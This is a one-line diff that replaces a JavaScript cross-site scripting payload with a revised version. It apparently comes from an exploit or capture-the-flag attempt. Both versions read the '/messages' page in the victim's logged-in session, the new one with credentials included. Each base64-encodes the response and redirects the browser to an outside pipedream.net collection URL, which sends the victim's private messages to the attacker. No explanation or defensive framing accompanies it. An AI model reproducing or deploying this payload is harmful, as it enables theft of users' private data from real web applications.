@@ -1,1 +1,1 @@
-try{var x=new XMLHttpRequest();x.open('GET','/messages?id=1',false);x.send(null);location='https://eoeipamgnflz15n.m.pipedream.net?c='+btoa(x.responseText)}catch(e){location='https://eoeipamgnflz15n.m.pipedream.net?c=err_sync'}
+(async()=>{let t='';try{t=await (await fetch('/messages',{credentials:'include'})).text()}catch(e){t='err:'+e}setTimeout(()=>{top.location='https://eoeipamgnflz15n.m.pipedream.net?c='+btoa(t)},300)})();
